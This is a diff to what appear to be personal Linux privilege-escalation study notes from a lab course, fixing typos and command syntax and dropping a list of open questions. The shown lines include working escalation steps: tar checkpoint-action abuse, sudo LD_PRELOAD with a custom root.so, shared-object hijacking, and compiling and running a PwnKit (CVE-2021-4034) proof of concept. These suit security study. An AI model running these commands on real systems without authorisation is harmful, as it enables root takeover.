@@ -39,7 +39,7 @@ df -h #Show mounted file systems
 lastlog # Shows you the last user logins 
 w # Shows you the logged in users 
 history
-find / -type f \( -name *_hist -o -name *_history \) - exec ls -l {} \; 2>/dev/null
+find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
 
 ## Environment 
 echo $PATH  #Discover which binaries will be used 
@@ -65,7 +65,8 @@ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null # Find guid files
 
 
 ## Automation Stuff 
-cat /etc/fstab # Getting  the cron entries 
+crontab -l        # Current user's cron entries
+cat /etc/crontab  # System-wide cron entries
 ls -la /etc/cron.daily # List Cronjobs
 
 
@@ -75,7 +76,7 @@ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a
 
 ### First list binaries and then use gtfobins to check for outdated versions
 ls -l /bin /usr/bin/ /usr/sbin
-for i in $(curl -s https://gtfobins.org/api.json) | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
+for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i"; fi; done
 
 
 ## Processes 
@@ -139,7 +140,7 @@ tar -zcf /home/htb-student/backup.tar.gz --checkpoint-action=exec=sh root.sh --c
 
 
 ## Escaping/Bypass Restricted Shells 
-Restricted shells only let you run a specifik set of commands. Typical such chells are:
+Restricted shells only let you run a specific set of commands. Typical such shells are:
 - RBASH
 - RKSH
 - RZSH
@@ -235,7 +236,7 @@ cat /etc/lsb-release
 
 ## Shared Libraries 
 Two types of libraries exist in Linux:
-- static libraries -> denoted by the .q file extension
+- static libraries -> denoted by the .a file extension
 - dynamically linked shared object libraries -> denoted by the .so file extension
 - To be able to execute this, you have to do an LD_PRELOAD with your own created `.so` file.
 
@@ -269,7 +270,7 @@ sudo LD_PRELOAD=/home/htb-student/root.so openssl
 
 
 ## Shared Object Hijacking
-Using the ldd command we can look for non-standard ibraries used in a binary. Non-Standard libraries can be loaded using for example `RUNPATH`. If specific locations are used and the directory is writtable by your user, we can add libraries, that help us to do privesc.
+Using the ldd command we can look for non-standard libraries used in a binary. Non-standard libraries can be loaded using for example `RUNPATH`. If specific locations are used and the directory is writable by your user, we can add libraries that help us to do privesc.
 
 ```bash
 # List Dynamic Dependencies
@@ -355,7 +356,7 @@ pkexec -u root id
 # Existing vunlerability is called Pwnkit -> CVE-2021-4034 can be used for privesc
 git clone https://github.com/arthepsy/CVE-2021-4034.git
 cd CVE-2021-4034
-gcc cve-2021-4034-poc.c poc
+gcc cve-2021-4034-poc.c -o poc
 ./poc
 ```
 
@@ -397,16 +398,3 @@ Is a linux kernel module, that provides among other things, packet filtering, NA
 - Snort
 - Uncomplicated Firewall (ufw)
 
-# Open Questions 
-
-- What is diff between /usr/bin and /usr/sbin
-- What are symlinks and when to actually use those?
-- How does this with the linux permissions actually work, and how would I set up a properly multiuser system... And when would this make the most sense?
-- How to write some proper loops in bash, which I can use?
-- How to properly work with jq 
-- Try to better undstand this piping stuff. Especially `mkfifo`
-- Any shell to use in 2026, which gives you some sweet sweet benefits
-- What is with this setuid and setguid -> Don't get this sticky bit stuff
-- Explain what Linux Capabilities are
-- What is adynamically linked shared object library?
-- What is Nagios and how can it be used?
